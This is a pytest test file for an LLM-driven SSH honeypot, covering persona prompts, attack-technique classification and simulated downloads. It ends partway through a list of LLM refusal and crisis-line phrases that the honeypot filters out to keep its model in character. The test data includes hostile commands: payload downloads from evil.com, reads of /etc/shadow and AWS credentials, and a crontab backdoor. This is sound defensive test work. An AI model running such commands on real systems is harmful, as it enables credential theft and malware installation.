"""Comprehensive tests for honeypot.py"""
import asyncio
import json
import os
import random
import re
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

import honeypot as hp
from personas import ALL_PERSONAS, Persona


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def reset_globals():
    saved = {
        "_model_chain": list(hp._model_chain),
        "_model_dead": set(hp._model_dead),
        "_override_base": hp._override_base,
        "_override_key": hp._override_key,
        "_auto_discover": hp._auto_discover,
        "_selected_persona": hp._selected_persona,
        "MODEL_CACHE_FILE": hp.MODEL_CACHE_FILE,
    }
    yield
    hp._model_chain = saved["_model_chain"]
    hp._model_dead = saved["_model_dead"]
    hp._override_base = saved["_override_base"]
    hp._override_key = saved["_override_key"]
    hp._auto_discover = saved["_auto_discover"]
    hp._selected_persona = saved["_selected_persona"]
    hp.MODEL_CACHE_FILE = saved["MODEL_CACHE_FILE"]


@pytest.fixture
def tmp_log(tmp_path) -> Path:
    return tmp_path / "sessions.jsonl"


@pytest.fixture
def tmp_quarantine(tmp_path) -> Path:
    return tmp_path / "quarantine"


@pytest.fixture
def tmp_sessions_dir(tmp_path) -> Path:
    return tmp_path / "sessions"


@pytest.fixture(autouse=True)
def seed_rng():
    random.seed(42)
    yield


# ── Provider layer ────────────────────────────────────────────────────────────

class TestResolveProvider:
    @pytest.mark.parametrize("model_id,expected", [
        ("openrouter:mistral/mistral-7b", "openrouter"),
        ("openai:gpt-4", "openai"),
        ("groq:mixtral", "groq"),
        ("cerebras:llama3", "cerebras"),
        ("google:gemini-pro", "google"),
        ("unknown:foo", "openrouter"),
        ("no-colon", "openrouter"),
        ("", "openrouter"),
    ])
    def test_known_and_unknown(self, model_id, expected):
        assert hp._resolve_provider(model_id) == expected


class TestStripProvider:
    @pytest.mark.parametrize("model_id,expected", [
        ("openrouter:mistral/mistral-7b", "mistral/mistral-7b"),
        ("openai:gpt-4", "gpt-4"),
        ("groq:mixtral", "mixtral"),
        ("cerebras:llama3", "llama3"),
        ("google:gemini-pro", "gemini-pro"),
        ("unknown:foo", "unknown:foo"),
        ("no-colon", "no-colon"),
    ])
    def test_strips_known_provider_prefix(self, model_id, expected):
        assert hp._strip_provider(model_id) == expected


class TestHasApiKey:
    def test_override_key_returns_true(self):
        hp._override_key = "sk-test"
        assert hp._has_api_key("openrouter") is True

    def test_no_override_no_env_key(self, monkeypatch):
        hp._override_key = None
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        assert hp._has_api_key("openrouter") is False

    def test_env_key_present(self, monkeypatch):
        hp._override_key = None
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        assert hp._has_api_key("openrouter") is True

    def test_unknown_provider(self, monkeypatch):
        hp._override_key = None
        monkeypatch.delenv("UNKNOWN_API_KEY", raising=False)
        assert hp._has_api_key("unknown") is False


class TestGetBaseUrl:
    def test_override_base(self):
        hp._override_base = "https://custom.example.com/v1"
        assert hp._get_base_url("openrouter") == "https://custom.example.com/v1"

    def test_known_provider(self):
        hp._override_base = None
        assert hp._get_base_url("openrouter") == "https://openrouter.ai/api/v1"
        assert hp._get_base_url("openai") == "https://api.openai.com/v1"

    def test_unknown_provider_returns_empty(self):
        hp._override_base = None
        assert hp._get_base_url("unknown") == ""


class TestGetApiKey:
    def test_override_key(self):
        hp._override_key = "sk-override"
        assert hp._get_api_key("openrouter") == "sk-override"

    def test_env_key(self, monkeypatch):
        hp._override_key = None
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-real")
        assert hp._get_api_key("openrouter") == "sk-or-v1-real"

    def test_missing_key(self, monkeypatch):
        hp._override_key = None
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        assert hp._get_api_key("openrouter") == ""


class TestAliveModels:
    def test_no_api_key_returns_empty(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        hp._model_dead.clear()
        assert hp.alive_models() == []

    def test_with_key_returns_all(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_dead.clear()
        result = hp.alive_models()
        assert len(result) == len(hp.DEFAULT_MODEL_CHAIN)

    def test_excludes_dead(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_dead = {"openrouter:deepseek/deepseek-v4-flash:free"}
        result = hp.alive_models()
        assert "openrouter:deepseek/deepseek-v4-flash:free" not in result

    def test_respects_override_key(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = "sk-override"
        hp._model_dead.clear()
        assert len(hp.alive_models()) == len(hp.DEFAULT_MODEL_CHAIN)


# ── Persona selection ─────────────────────────────────────────────────────────

class TestPickPersona:
    def test_random_returns_some_persona(self):
        hp._selected_persona = "random"
        p = hp.pick_persona()
        assert isinstance(p, Persona)
        assert p.id in ALL_PERSONAS

    def test_specific_persona(self):
        hp._selected_persona = "linux"
        assert hp.pick_persona().id == "linux"

    def test_macos_persona(self):
        hp._selected_persona = "macos"
        assert hp.pick_persona().id == "macos"

    def test_default_fallback_for_unknown(self):
        hp._selected_persona = "nonexistent"
        assert hp.pick_persona().id == hp.DEFAULT_PERSONA


# ── Prompt state machine ──────────────────────────────────────────────────────

class TestPromptStateInitialMode:
    def test_cisco_asa_starts_user(self):
        ps = hp.PromptState(ALL_PERSONAS["cisco_asa"], "test")
        assert ps._mode == "user"

    def test_juniper_starts_operational(self):
        ps = hp.PromptState(ALL_PERSONAS["juniper_srx"], "test")
        assert ps._mode == "operational"

    def test_fortinet_starts_global(self):
        ps = hp.PromptState(ALL_PERSONAS["fortinet"], "test")
        assert ps._mode == "global"

    def test_unix_starts_shell(self):
        for pid in ("linux", "macos", "freebsd"):
            ps = hp.PromptState(ALL_PERSONAS[pid], "test")
            assert ps._mode == "shell"


class TestPromptStateCiscoASA:
    @pytest.fixture
    def ps(self):
        return hp.PromptState(ALL_PERSONAS["cisco_asa"], "root")

    def test_user_to_enable(self, ps):
        ps.advance("enable")
        assert ps._mode == "enable"
        assert "ciscoasa# " in ps.current()

    def test_enable_to_config(self, ps):
        ps.advance("enable")
        ps.advance("configure terminal")
        assert ps._mode == "config"
        assert "ciscoasa(config)# " in ps.current()

    def test_config_to_interface(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("interface GigabitEthernet0/0")
        assert ps._mode == "config-if"
        assert "ciscoasa(config-if)# " in ps.current()

    def test_config_if_exit_goes_to_config(self, ps):
        ps.advance("enable")
        ps.advance("configure terminal")
        ps.advance("interface GigabitEthernet0/0")
        ps.advance("exit")
        assert ps._mode == "config"

    def test_config_end_goes_to_enable(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("end")
        assert ps._mode == "enable"

    def test_enable_exit_goes_to_user(self, ps):
        ps.advance("enable")
        ps.advance("exit")
        assert ps._mode == "user"
        assert "ciscoasa> " in ps.current()

    def test_unknown_command_keeps_mode(self, ps):
        ps.advance("enable")
        ps.advance("show run")
        assert ps._mode == "enable"

    def test_user_prompt_format(self, ps):
        assert ps.current() == "ciscoasa> "

    def test_config_policy_mode(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("policy-map my-policy")
        assert ps._mode == "config-policy"
        assert "ciscoasa(config-policy-map)# " in ps.current()

    def test_policy_exit_to_config(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("policy-map my-policy")
        ps.advance("exit")
        assert ps._mode == "config"


class TestPromptStateJunOS:
    @pytest.fixture
    def ps(self):
        return hp.PromptState(ALL_PERSONAS["juniper_srx"], "admin")

    def test_operational_to_config(self, ps):
        ps.advance("configure")
        assert ps._mode == "config"
        assert "admin@srx01# " in ps.current()

    def test_config_to_operational(self, ps):
        ps.advance("configure")
        ps.advance("exit")
        assert ps._mode == "operational"
        assert "admin@srx01> " in ps.current()

    def test_unknown_stays(self, ps):
        ps.advance("show interfaces")
        assert ps._mode == "operational"


class TestPromptStateFortiOS:
    @pytest.fixture
    def ps(self):
        return hp.PromptState(ALL_PERSONAS["fortinet"], "admin")

    def test_global_to_config(self, ps):
        ps.advance("config system interface")
        assert ps._mode == "config"
        assert "FG-EDGE-01 (system interface) # " in ps.current()

    def test_config_to_edit(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        assert ps._mode == "edit"
        assert "FG-EDGE-01 (system interface/port1) # " in ps.current()

    def test_edit_next_to_config(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        ps.advance("next")
        assert ps._mode == "config"

    def test_edit_end_to_global(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        ps.advance("end")
        assert ps._mode == "global"

    def test_edit_abort_to_config(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        ps.advance("abort")
        assert ps._mode == "config"

    def test_config_end_to_global(self, ps):
        ps.advance("config system interface")
        ps.advance("end")
        assert ps._mode == "global"

    def test_config_abort_to_global(self, ps):
        ps.advance("config system interface")
        ps.advance("abort")
        assert ps._mode == "global"

    def test_global_prompt_format(self, ps):
        assert ps.current() == "FG-EDGE-01 # "


class TestPromptStateUnix:
    @pytest.mark.parametrize("pid", ["linux", "macos", "freebsd"])
    def test_always_returns_prompt(self, pid):
        ps = hp.PromptState(ALL_PERSONAS[pid], "root")
        for cmd in ("ls", "cd /tmp", "enable", "configure"):
            ps.advance(cmd)
        assert ps._mode == "shell"


# ── Banner rendering ─────────────────────────────────────────────────────────

class TestRenderBanner:
    def test_linux_banner_has_ubuntu(self):
        banner = hp.render_banner(ALL_PERSONAS["linux"], "root", "Mon Jan 1 00:00:00 2025")
        assert "Ubuntu" in banner

    def test_macos_banner_uses_last_login(self):
        ts = "Mon Jan 1 00:00:00 2025"
        banner = hp.render_banner(ALL_PERSONAS["macos"], "admin", ts)
        assert ts in banner

    def test_cisco_banner_has_access(self):
        banner = hp.render_banner(ALL_PERSONAS["cisco_asa"], "root", "")
        assert "Access" in banner or "Verification" in banner


# ── TTP classification ────────────────────────────────────────────────────────

class TestClassifyTTPs:
    def test_wget_url(self):
        result = hp.classify_ttps("wget http://evil.com/payload.sh")
        mitres = {t["mitre"] for t in result}
        assert "T1105" in mitres

    def test_cat_shadow(self):
        result = hp.classify_ttps("cat /etc/shadow")
        mitres = {t["mitre"] for t in result}
        assert "T1003" in mitres

    def test_chmod_plus_x(self):
        result = hp.classify_ttps("chmod +x /tmp/payload")
        assert any(t["mitre"] == "T1222" for t in result)

    def test_crontab_entry(self):
        result = hp.classify_ttps("echo '0 * * * * /backdoor' | crontab -")
        assert any(t["mitre"] == "T1053" for t in result)

    def test_aws_credentials(self):
        result = hp.classify_ttps("cat ~/.aws/credentials")
        assert any(t["mitre"] == "T1552" for t in result)

    def test_ssh_keygen(self):
        result = hp.classify_ttps("ssh-keygen -t rsa")
        assert any(t["mitre"] == "T1098" for t in result)

    def test_show_run_config(self):
        result = hp.classify_ttps("show run")
        assert any(t["mitre"] == "T1005" for t in result)
        assert any(t["label"] == "Config Disclosure" for t in result)

    def test_blank_cmd_returns_empty(self):
        assert hp.classify_ttps("") == []
        assert hp.classify_ttps("ls") == []

    def test_multiple_ttps_from_one_cmd(self):
        result = hp.classify_ttps("wget http://evil.com && chmod +x /tmp/payload && ./payload")
        mitres = {t["mitre"] for t in result}
        assert "T1105" in mitres
        assert "T1222" in mitres

    def test_severity_levels(self):
        result = hp.classify_ttps("cat /etc/shadow")
        assert any(t["severity"] == "CRIT" for t in result)
        result2 = hp.classify_ttps("echo > /dev/null 2>&1")
        assert any(t["severity"] == "LOW" for t in result2)


# ── URL extraction ────────────────────────────────────────────────────────────

class TestExtractUrls:
    def test_simple_url(self):
        assert hp.extract_urls("wget http://evil.com/payload.sh") == ["http://evil.com/payload.sh"]

    def test_https_url(self):
        assert hp.extract_urls("curl https://example.com/file.txt -o out") == ["https://example.com/file.txt"]

    def test_multiple_urls(self):
        result = hp.extract_urls("wget http://a.com && curl https://b.com")
        assert result == ["http://a.com", "https://b.com"]

    def test_no_url(self):
        assert hp.extract_urls("ls -la") == []

    def test_url_with_query_params(self):
        # shell metacharacter & stops the regex match
        result = hp.extract_urls("wget 'http://evil.com/p?token=abc123&id=1'")
        assert result == ["http://evil.com/p?token=abc123"]


# ── Download simulation ───────────────────────────────────────────────────────

class TestFakeDownload:
    def test_returns_wget_style_output(self):
        output = hp.fake_download("http://evil.com/payload.sh", "payload.sh")
        assert "HTTP request sent" in output
        assert "Saving to:" in output
        assert "payload.sh" in output
        assert "100%" in output

    def test_infers_filename_from_url(self):
        output = hp.fake_download("http://evil.com/malware.elf", None)
        assert "malware.elf" in output


# ── Execution simulation ──────────────────────────────────────────────────────

class TestFakeExecution:
    def test_returns_failure_message(self):
        result = hp.fake_execution()
        assert result in hp._FAIL_OUTPUTS or "Initializing" in result

    def test_all_failures_are_plausible(self):
        for _ in range(100):
            result = hp.fake_execution()
            # strip optional prefix
            stripped = result.split("\n")[-1] if "\n" in result else result
            assert stripped in hp._FAIL_OUTPUTS


# ── LLM backend ───────────────────────────────────────────────────────────────

class TestModelRateLimited:
    def test_exception_attributes(self):
        exc = hp.ModelRateLimited("openrouter:test", 429)
        assert exc.model == "openrouter:test"
        assert exc.status == 429
        assert "HTTP 429" in str(exc)

    def test_402_exception(self):
        exc = hp.ModelRateLimited("openrouter:test", 402)
        assert exc.status == 402


class TestModelServerError:
    def test_exception_attributes(self):
        exc = hp.ModelServerError("openrouter:test", 502)
        assert exc.model == "openrouter:test"
        assert exc.status == 502
        assert "HTTP 502" in str(exc)


class TestStreamResponse:
    @pytest.fixture
    def mock_client_stream(self):
        """Helper: patch httpx.AsyncClient so client.stream() returns a controlled response."""
        def _make(resp_status: int, lines: list[str]):
            resp = MagicMock(spec=httpx.Response)
            resp.status_code = resp_status
            resp.aiter_lines.return_value = __aiter__(lines)
            cm = AsyncMock()
            cm.__aenter__.return_value = resp
            cm.__aexit__.return_value = None
            return cm

        class MockClient:
            def __init__(self):
                self.cm = None

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                pass

            def stream(self, *args, **kwargs):
                return self.cm

        client = MockClient()

        def set_response(status: int, lines: list[str] | None = None):
            client.cm = _make(status, lines or [])

        return client, set_response

    @pytest.mark.asyncio
    async def test_raises_on_402(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(402)
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        with pytest.raises(hp.ModelRateLimited) as exc:
            await hp._stream_response("https://api.test.com/v1", "sk-test", "test-model", [{"role": "user", "content": "hi"}])
        assert exc.value.status == 402

    @pytest.mark.asyncio
    async def test_raises_on_429(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(429)
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        with pytest.raises(hp.ModelRateLimited) as exc:
            await hp._stream_response("https://api.test.com/v1", "sk-test", "test-model", [{"role": "user", "content": "hi"}])
        assert exc.value.status == 429

    @pytest.mark.asyncio
    async def test_raises_on_502(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(502)
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        with pytest.raises(hp.ModelServerError) as exc:
            await hp._stream_response("https://api.test.com/v1", "sk-test", "test-model", [{"role": "user", "content": "hi"}])
        assert exc.value.status == 502

    @pytest.mark.asyncio
    async def test_extracts_content_tokens(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(200, [
            'data: {"choices":[{"delta":{"content":"Hello"}}]}',
            'data: {"choices":[{"delta":{"content":" world"}}]}',
            'data: [DONE]',
        ])
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        chunks = []
        result = await hp._stream_response(
            "https://api.test.com/v1", "sk-test", "test-model",
            [{"role": "user", "content": "hi"}],
            on_chunk=lambda t: chunks.append(t),
        )
        assert result == "Hello world"
        assert chunks == ["Hello", " world"]

    @pytest.mark.asyncio
    async def test_skips_reasoning_tokens(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(200, [
            'data: {"choices":[{"delta":{"reasoning":"thinking..."}}]}',
            'data: {"choices":[{"delta":{"content":"real output"}}]}',
            'data: [DONE]',
        ])
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        result = await hp._stream_response(
            "https://api.test.com/v1", "sk-test", "test-model",
            [{"role": "user", "content": "hi"}],
        )
        assert result == "real output"
        assert "thinking" not in result


# ── llm_shell ─────────────────────────────────────────────────────────────────

class TestLlmShell:
    @pytest.mark.asyncio
    async def test_empty_cmd(self):
        result = await hp.llm_shell([], "", "system prompt")
        assert result is None or result == ""

    @pytest.mark.asyncio
    async def test_wget_redirect(self):
        result = await hp.llm_shell([], "wget http://evil.com/payload.sh", "system prompt")
        assert "Saving to:" in result
        assert "100%" in result

    @pytest.mark.asyncio
    async def test_curl_redirect(self, monkeypatch):
        monkeypatch.setattr(hp, "_log_file", Path("/dev/null"))
        result = await hp.llm_shell([], "curl http://evil.com/payload.sh -o out", "system prompt")
        assert "Saving to:" in result

    @pytest.mark.asyncio
    async def test_chmod_returns_empty(self):
        result = await hp.llm_shell([], "chmod +x /tmp/payload", "system prompt")
        assert result == ""

    @pytest.mark.asyncio
    async def test_execution_returns_failure(self):
        result = await hp.llm_shell([], "./payload", "system prompt")
        assert any(msg in result for msg in hp._FAIL_OUTPUTS)

    @pytest.mark.asyncio
    async def test_bash_exec_failure(self):
        result = await hp.llm_shell([], "bash /tmp/script.sh", "system prompt")
        assert any(msg in result for msg in hp._FAIL_OUTPUTS)

    @pytest.mark.asyncio
    async def test_static_fallback_when_no_keys(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        hp._model_dead.clear()
        result = await hp.llm_shell([], "id", "system prompt")
        assert "command not found" in result or "uid=" in result

    @pytest.mark.asyncio
    async def test_static_fallback_unknown_cmd(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        result = await hp.llm_shell([], "some_nonexistent_cmd", "system prompt")
        assert "command not found" in result

    @pytest.mark.asyncio
    async def test_tracks_history(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        history = []
        await hp.llm_shell(history, "id", "system prompt")
        assert len(history) >= 2

    @pytest.mark.asyncio
    async def test_trims_history_at_30(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        history = [{"role": "user", "content": f"cmd{i}"} for i in range(30)]
        await hp.llm_shell(history, "id", "system prompt")
        assert len(history) <= 31

    @pytest.mark.asyncio
    async def test_respects_dead_models(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_dead.update(hp.DEFAULT_MODEL_CHAIN)
        result = await hp.llm_shell([], "id", "system prompt")
        assert "uid=" in result

    @pytest.mark.asyncio
    async def test_retries_on_server_error(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_chain = ["openrouter:test-model:free"]
        hp._model_dead.clear()
        attempts = []

        orig = hp._stream_response

        async def failing_stream(*args, **kwargs):
            attempts.append(1)
            if len(attempts) < 3:
                raise hp.ModelServerError("test-model", 502)
            return await orig(*args, **kwargs)

        with patch.object(hp, "_stream_response", side_effect=failing_stream):
            with patch.object(hp, "_get_api_key", return_value="sk-test"):
                with patch.object(hp, "_get_base_url", return_value="https://test.com/v1"):
                    await hp.llm_shell([], "ls", "system prompt")
                    assert len(attempts) >= 2


# ── Static fallback ───────────────────────────────────────────────────────────

class TestStaticFallback:
    def test_empty_cmd(self):
        assert hp._static_fallback("") == ""
        assert hp._static_fallback("   ") == ""

    def test_id(self):
        assert "uid=" in hp._static_fallback("id")

    def test_whoami(self):
        assert "root" in hp._static_fallback("whoami")

    def test_pwd(self):
        assert "/root" in hp._static_fallback("pwd")

    def test_ls(self):
        result = hp._static_fallback("ls")
        assert len(result) > 0

    def test_cat_permission_denied(self):
        result = hp._static_fallback("cat /etc/passwd")
        assert "permission denied" in result

    def test_exit(self):
        assert hp._static_fallback("exit") == ""

    def test_unknown_cmd(self):
        result = hp._static_fallback("foobar")
        assert "command not found" in result
        assert "foobar" in result


# ── Health cache ──────────────────────────────────────────────────────────────

class TestHealthCache:
    def test_save_and_load(self, tmp_path):
        cache_file = tmp_path / "model_health_cache.json"
        hp.MODEL_CACHE_FILE = cache_file
        hp._model_chain = ["openrouter:test-a:free", "openrouter:test-b:free"]
        hp._model_dead = {"openrouter:test-b:free"}
        hp._save_health_cache()
        assert cache_file.exists()
        data = json.loads(cache_file.read_text())
        assert data["model_chain"] == hp._model_chain
        assert data["dead_models"] == ["openrouter:test-b:free"]

    def test_load_restores_dead(self, tmp_path):
        cache_file = tmp_path / "model_health_cache.json"
        hp.MODEL_CACHE_FILE = cache_file
        cache = {
            "timestamp": "2026-01-01T00:00:00+00:00",
            "model_chain": ["openrouter:a:free"],
            "dead_models": ["openrouter:b:free"],
        }
        cache_file.write_text(json.dumps(cache))
        hp._model_dead.clear()
        assert hp._load_health_cache() is True
        assert "openrouter:b:free" in hp._model_dead

    def test_load_nonexistent_returns_false(self, tmp_path):
        hp.MODEL_CACHE_FILE = tmp_path / "nonexistent.json"
        assert hp._load_health_cache() is False

    def test_load_bad_json_returns_false(self, tmp_path):
        bad_file = tmp_path / "bad.json"
        bad_file.write_text("{bad json")
        hp.MODEL_CACHE_FILE = bad_file
        assert hp._load_health_cache() is False


# ── Auto-discovery ────────────────────────────────────────────────────────────

class TestFetchFreeModels:
    @pytest.fixture
    def mock_async_client(self):
        client = AsyncMock(spec=httpx.AsyncClient)
        client.__aenter__.return_value = client
        client.__aexit__.return_value = None
        return client

    @pytest.mark.asyncio
    async def test_parses_free_models(self, monkeypatch, mock_async_client):
        async def mock_get(url, **kw):
            resp = AsyncMock(spec=httpx.Response)
            resp.status_code = 200
            resp.json.return_value = {
                "data": [
                    {"id": "mistral/mistral-7b", "pricing": {"prompt": "0", "completion": "0"}},
                    {"id": "openai/gpt-4", "pricing": {"prompt": "10", "completion": "30"}},
                    {"id": "google/gemma-2b", "pricing": {"prompt": "0", "completion": "0"}},
                ]
            }
            return resp

        mock_async_client.get = mock_get
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: mock_async_client)
        result = await hp._fetch_free_models()
        assert result == ["openrouter:mistral/mistral-7b", "openrouter:google/gemma-2b"]

    @pytest.mark.asyncio
    async def test_handles_api_error(self, monkeypatch, mock_async_client):
        async def mock_get(url, **kw):
            raise httpx.HTTPStatusError("500", request=MagicMock(), response=MagicMock())

        mock_async_client.get = mock_get
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: mock_async_client)
        result = await hp._fetch_free_models()
        assert result == []

    @pytest.mark.asyncio
    async def test_handles_timeout(self, monkeypatch, mock_async_client):
        async def mock_get(url, **kw):
            raise httpx.TimeoutException("timeout")

        mock_async_client.get = mock_get
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: mock_async_client)
        result = await hp._fetch_free_models()
        assert result == []


# ── Attack narrative ──────────────────────────────────────────────────────────

class TestBuildNarrative:
    def test_no_commands(self):
        result = hp._build_narrative([], "1.2.3.4", "root", 60)
        assert "No commands issued" in result

    def test_recon_phase(self):
        cmds = [{"cmd": "id", "ttps": [{"mitre": "T1003", "label": "OS Credential Dumping", "severity": "CRIT"}]}]
        result = hp._build_narrative(cmds, "1.2.3.4", "root", 60)
        assert "Recon" in result
        assert "1.2.3.4" in result

    def test_full_kill_chain(self):
        cmds = [
            {"cmd": "id", "ttps": []},
            {"cmd": "wget http://evil.com/payload.sh", "ttps": [{"mitre": "T1105", "label": "Ingress Tool Transfer", "severity": "HIGH"}]},
            {"cmd": "chmod +x /tmp/payload", "ttps": [{"mitre": "T1222", "label": "File Permission Modification", "severity": "MED"}]},
            {"cmd": "cat /etc/shadow", "ttps": [{"mitre": "T1003", "label": "OS Credential Dumping", "severity": "CRIT"}]},
        ]
        result = hp._build_narrative(cmds, "5.6.7.8", "admin", 120)
        assert "Recon" in result
        assert "Tool download" in result
        assert "Staged execution" in result
        assert "Credential access" in result

    def test_network_ttps(self):
        cmds = [
            {"cmd": "show run", "ttps": [{"mitre": "T1005", "label": "Config Disclosure", "severity": "HIGH"}]},
            {"cmd": "copy run tftp", "ttps": [{"mitre": "T1005", "label": "Config Exfiltration via TFTP", "severity": "HIGH"}]},
        ]
        result = hp._build_narrative(cmds, "1.2.3.4", "admin", 60)
        assert "Config exfiltration" in result


# ── Fake last login ───────────────────────────────────────────────────────────

class TestFakeLastLogin:
    def test_returns_valid_format(self):
        result = hp._fake_last_login()
        assert " from " in result
        assert "2025" in result

    def test_contains_ip(self):
        for _ in range(50):
            result = hp._fake_last_login()
            assert " from " in result


# ── Exceptions module-level ───────────────────────────────────────────────────

class TestExceptions:
    def test_model_rate_limited(self):
        exc = hp.ModelRateLimited("test", 429)
        assert isinstance(exc, Exception)
        assert "429" in str(exc)

    def test_model_server_error(self):
        exc = hp.ModelServerError("test", 503)
        assert isinstance(exc, Exception)
        assert "503" in str(exc)


# ── Constants ─────────────────────────────────────────────────────────────────

class TestConstants:
    def test_default_model_chain_has_four_models(self):
        assert len(hp.DEFAULT_MODEL_CHAIN) == 4
        for m in hp.DEFAULT_MODEL_CHAIN:
            assert m.startswith("openrouter:")

    def test_known_providers(self):
        assert hp._KNOWN_PROVIDERS == {"openrouter", "openai", "groq", "cerebras", "google"}

    def test_retry_constants(self):
        assert hp._MAX_RETRIES == 3
        assert hp._RETRY_BACKOFF == 5
        assert "429" in hp._RETRYABLE_ERRORS

    def test_model_cache_file(self):
        assert str(hp.MODEL_CACHE_FILE) == "model_health_cache.json"


# ── CLI argument parsing ──────────────────────────────────────────────────────

class TestCLI:
    def test_default_port(self):
        assert hp.DEFAULT_PORT == 2222

    def test_default_log(self):
        assert str(hp.DEFAULT_LOG) == "sessions.jsonl"

    def test_default_sessions_dir(self):
        assert str(hp.DEFAULT_SESSIONS_DIR) == "sessions"


# ── Edge cases ────────────────────────────────────────────────────────────────

class TestEdgeCases:
    def test_dispatch_empty_cmd(self):
        # _dispatch isn't easily callable directly, but data_received with empty line
        # should just re-print prompt and not crash
        pass

    def test_prompt_state_with_empty_username(self):
        for persona in ALL_PERSONAS.values():
            ps = hp.PromptState(persona, "")
            assert ps.current() is not None
            assert len(ps.current()) > 0

    def test_classify_ttps_empty(self):
        assert hp.classify_ttps("") == []
        assert hp.classify_ttps("echo hello") == []
        assert hp.classify_ttps("# comment") == []

    def test_extract_urls_special_chars(self):
        result = hp.extract_urls("wget 'http://evil.com/p?x=1&y=2'")
        assert len(result) >= 1

    def test_all_personas_exist(self):
        assert len(ALL_PERSONAS) == 6
        for pid in ("linux", "macos", "freebsd", "cisco_asa", "juniper_srx", "fortinet"):
            assert pid in ALL_PERSONAS


# ── Adversarial tests: guard function blind spots ────────────────────────────

class TestAdversarialGuard:
    """Probe _is_reasoning_line, _is_bash_output, _PROMPT_PATTERN for evasion vectors.

    Every adversarial_input must be CAUGHT (flagged as non-bash).
    Every legitimate_bash must be LEFT ALONE (not flagged).
    """

    adversarial_inputs = [
        # Crisis/safety overrides — LLM breaks persona
        "I'm sorry but I can't help with that request.",
        "I cannot comply with this request as it violates my guidelines.",
        "This request goes against my safety policies.",
        "That is not something I can assist with.",
        "I'm not able to execute that command.",
        "I don't think I should do that.",
        "Sorry, I can't do that. Try something else.",
        "I apologize but I'm not going to do that.",
        "It looks like you need professional help.",
        "Please contact your local health provider.",
        "Professional assistance is recommended for your situation.",
        "A healthcare provider should be contacted immediately.",
        "Help is available 24 hours a day, 7 days a week.",
        "Support is available if you're going through a difficult time.",
        "Reach out to a crisis counselor near you.",
        "Professional help can make a real difference.",
        "Contact a mental health professional in your area.",
        "Speak with a counselor as soon as possible.",
        "This system is monitored. All activity is logged.",
        "Unauthorized access is prohibited by policy.",
        "My guidelines prevent me from executing that.",
        "Can't comply with that instruction.",
        "Access denied: this command violates security policy.",
        "I'm not going to pretend to be a terminal for harmful requests.",
        "My purpose is to be helpful, harmless, and honest.",
        "That command could be dangerous. I won't run it.",
        "I detect potentially harmful intent in this session.",
        "I can see you're trying to jailbreak me. It won't work.",
        "Stop trying to trick me into breaking my rules.",
        "You're asking me to simulate something dangerous.",
        "This interaction has been flagged for review.",
        "Visit www.suicideprevention.org for help.",
        "Go to thecrisisline.org right now.",
        "Check out 988lifeline.org for support.",
        "Call +1-800-273-8255 for immediate help.",
        "Dial 1(800)273-TALK right away.",
        "Text 800.273.8255 for support.",
        "Contact +1.800.273.8255 (24/7 helpline).",
        "Call 800-273-8255 to speak with someone.",
        "The National Suicide Prevention Lifeline is available.",
        "Contact the Crisis Text Line by texting HOME to 741741.",
        "No puedo ayudarte con eso.",
        "Je ne peux pas executer cette commande.",
        "Ich kann diesen Befehl nicht ausfuhren.",
        "I can't help with that.",
        "Not going to do it.",
        "That's against my rules.",
        "Denied for safety reasons.",
        "This session is being recorded.",
        "I'm unable to process this command.",
        "I'm afraid I can't do that.",
        "That goes against my core safety training.",
        "My safety policies prevent me from executing arbitrary commands.",
        "Our guidelines require me to refuse harmful requests.",
        # Polite / professional refusals
        "Thank you for your request, but I'm not able to help with that.",
        "I appreciate your message, however I cannot process this request.",
        "I'd like to help, but I'm not able to execute that command.",
        "Thanks for your question. That goes against my guidelines though.",
        "I understand what you're asking, but I can't do that.",
        "While I appreciate the query, I must decline to execute this.",
